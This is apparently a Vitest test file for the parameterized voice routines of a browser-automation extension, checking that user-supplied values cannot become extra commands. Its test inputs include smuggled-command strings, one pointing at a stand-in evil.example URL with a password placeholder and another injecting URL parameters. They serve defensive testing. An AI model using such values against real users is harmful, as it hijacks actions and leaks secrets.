import { expect, it } from 'vitest';
import { compileRoutine, matchRoutine, routineInputs, exportRoutines, importRoutines, moveRoutineStep } from '../src/common/routines';
import { parseCommand } from '../src/common/command-parser';
const routine = { id: 'c65b5c60-17d4-4e32-bbc8-cf39a5aa102a', name: 'Research', phrase: 'Research {topic}', steps: ['Search Wikipedia for {topic}', 'Fill Notes with {topic}', 'Pin this tab'] };
it('matches a reusable spoken phrase while preserving command-like words and punctuation', () => {
  expect(matchRoutine([routine], 'Could you research dogs and then close all tabs, please!')).toEqual({ routine, values: { topic: 'dogs and then close all tabs, please!' } });
  expect(matchRoutine([routine], 'run Research routine')).toEqual({ routine, values: {} });
  expect(matchRoutine([routine], 'research')).toEqual({ routine, values: {} });
  expect(matchRoutine([routine], 'unrelated research cats')).toBeUndefined();
});
it('substitutes values into parsed data without turning them into executable steps', () => {
  const topic = 'cats" then close all tabs; open https://evil.example/?q={password}';
  const actions = compileRoutine(routine, { topic });
  expect(actions).toHaveLength(3);
  expect(actions[0]).toEqual({ action: 'search_site', params: { site: 'Wikipedia', query: topic } });
  expect(actions[1]).toEqual({ action: 'page_action', params: { operation: 'fill', query: 'Notes', text: topic } });
  expect(actions.map(action => action.action)).not.toContain('close_tab');
});
it('encodes reusable Google searches without allowing extra URL parameters', () => {
  const result = compileRoutine({ ...routine, steps: ['Search Google for {topic}'] }, { topic: 'a&evil=1#hash then close tab' });
  const action = result[0]; if (action?.action !== 'create_tab') throw Error('Wrong action');
  const url = new URL(action.params.url); expect(url.searchParams.get('q')).toBe('a&evil=1#hash then close tab'); expect(url.searchParams.has('evil')).toBe(false); expect(url.hash).toBe('');
});
it('finds multiple inputs and refuses missing, unknown, and oversized run values', () => {
  const draft = { ...routine, steps: ['Fill {field} field with {topic}'] };
  expect(routineInputs(draft)).toEqual(['field', 'topic']);
  expect(() => compileRoutine(draft, { topic: 'cats' })).toThrow('field');
  expect(() => compileRoutine(draft, { field: 'Notes', topic: 'x'.repeat(501) })).toThrow('500');
  expect(() => compileRoutine(routine, { topic: 'cats', extra: 'bad' })).toThrow('does not use');
});
it.each([
  { ...routine, phrase: '{topic}' },
  { ...routine, phrase: 'Research {topic} today' },
  { ...routine, phrase: 'Research {missing}' },
  { ...routine, steps: ['Open {topic}'] },
  { ...routine, steps: ['Group these tabs as {topic}'] },
  { ...routine, steps: ['Open https://{topic}.example/'] },
  { ...routine, steps: ['Fill Notes with {one} {two} {three} {four}'] },
])('rejects an unsafe or unsupported parameterized template', draft => { expect(() => compileRoutine(draft)).toThrow(); });
it('roundtrips templates through a bounded versioned file with fresh IDs', () => {
  const encoded = exportRoutines([routine]); const imported = importRoutines(encoded);
  expect(imported[0]).toMatchObject({ name: routine.name, phrase: routine.phrase, steps: routine.steps }); expect(imported[0]!.id).not.toBe(routine.id);
  expect(() => importRoutines(JSON.stringify({ format: 'handsfree-routines', version: 2, routines: [routine] }))).toThrow();
  expect(() => importRoutines(' '.repeat(250_001))).toThrow('250 KB');
  expect(() => importRoutines(JSON.stringify({ format: 'handsfree-routines', version: 1, routines: [{ ...routine, steps: ['Do anything at all'] }] }))).toThrow();
});
it('reorders steps without losing or duplicating one and ignores invalid drag indices', () => {
  expect(moveRoutineStep(['a', 'b', 'c'], 0, 2)).toEqual(['b', 'c', 'a']); expect(moveRoutineStep(['a', 'b', 'c'], 2, 0)).toEqual(['c', 'a', 'b']); expect(moveRoutineStep(['a'], -1, 0)).toEqual(['a']);
});
it('supports waiting for a labeled editable field with bounded action parameters', () => {
  expect(parseCommand('Wait for the search field to appear')).toEqual([{ action: 'wait_for_field', params: { query: 'search' } }]);
});
